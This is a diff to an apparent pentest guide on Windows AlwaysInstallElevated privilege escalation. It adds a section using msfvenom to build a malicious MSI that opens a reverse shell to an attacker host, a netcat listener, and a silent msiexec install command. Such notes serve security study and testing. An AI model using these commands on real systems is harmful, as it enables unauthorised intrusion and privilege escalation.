@@ -15,7 +15,7 @@ This means that installation packages are installed with elevated privileges
 
 ## Exploitation
 
-- You should have a shell with covenant or metasploit or netcat.  
+- You should have a shell with covenant, metasploit or netcat or an access to the target.  
 We will use Covenant and Metasploit here.
 
 ### Covenant
@@ -100,6 +100,12 @@ We will use Covenant and Metasploit here.
 - You should get an elevated shell in msfconsole  
 ![image](https://user-images.githubusercontent.com/96747355/162576948-dfc37754-0345-408f-a344-5248975f34b8.png)  
 
+### Other way
+
+- Generate a malicious MSI package `msfvenom -p windows/shell_reverse_tcp lhost=IP-OF-ATTACK-MACHINE lport=PORT -f msi > file.msi`
+- Set up a listener `rlwrap nc -lnvp CHOSEN-PORT`
+- Upload it to the target and execute it from the cmd `msiexec /i c:\users\user\desktop\file.msi /quiet /qn /norestart`
+- You should get an elevated shell
 
 ## Resources
 
